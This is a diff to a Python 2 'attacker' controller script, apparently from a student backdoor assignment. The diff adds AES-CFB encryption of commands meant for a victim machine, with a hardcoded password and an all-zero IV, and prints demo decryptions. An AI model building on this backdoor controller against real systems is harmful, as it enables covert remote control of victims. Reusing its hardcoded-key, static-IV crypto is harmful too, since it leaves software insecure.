@@ -1,5 +1,7 @@
 #server / attacker
-import ConfigParser
+import ConfigParser, threading, hashlib
+#from Crypto import Random
+from Crypto.Cipher import AES
 
 configParser = ConfigParser.RawConfigParser()
 configFilePath = r'config.txt'
@@ -11,6 +13,48 @@ dstPort = configParser.get('config', 'dstPort')
 fileDir = configParser.get('config', 'fileDir')
 
 print dstIP
+
+
+
+
+
+
+#Using encryption code from backdoor assignment
+
+key = 'P@ssw0rd'
+IV = 16 * '\x00'#16 is block size
+
+#convert the password to a 32-byte key using the SHA-256 algorithm
+def getKey():
+	global key
+	return hashlib.sha256(key).digest()
+
+
+# decrypt using the CFB mode (cipher feedback)
+def decrypt(text):
+	global IV
+	key = getKey()
+	decipher = AES.new(key, AES.MODE_CFB, IV)
+	plaintext = decipher.decrypt(text)
+	return plaintext
+
+#encrypt using the CFB mode (cipher feedback)
+def encrypt(text):
+	key = getKey()
+	global IV
+	cipher = AES.new(key, AES.MODE_CFB, IV)
+	ciphertext = cipher.encrypt(text)
+	return ciphertext
+
+def badDecrypt(text):
+	global IV
+	key = "Password"
+	bkey = hashlib.sha256(key).digest()
+	decipher = AES.new(bkey, AES.MODE_CFB, IV)
+	plaintext = decipher.decrypt(text)
+	return plaintext
+
+
 
 
 
@@ -28,8 +72,14 @@ def getCmd(dstIP, srcIP, dstPort):
 			print "Closing port"
 
 		else :
+			encryptedCmd=encrypt(cmd)
+			print "Command: " + cmd
+			print "Encrypted command: "+ encryptedCmd
+			print "Decypted command with wrong password: "+badDecrypt(encryptedCmd)
+			print "Decrypted command with correct password: "+decrypt(encryptedCmd)
+			#encrypt the command
 			#create a packet to send to the victim
-			print "your command " + cmd
+			
 
 
 
@@ -46,6 +96,8 @@ def main():
 	cmdThread = threading.Thread(target=getCmd, args=(dstIP, srcIP, dstPort))
 	#fileThread = threading.Thread(target=getFile, args=(dstIP, srcIP, dstPort))
 	
+	cmdThread.start()
+	#fileThread.start()
 
 if __name__== '__main__':
 	main()
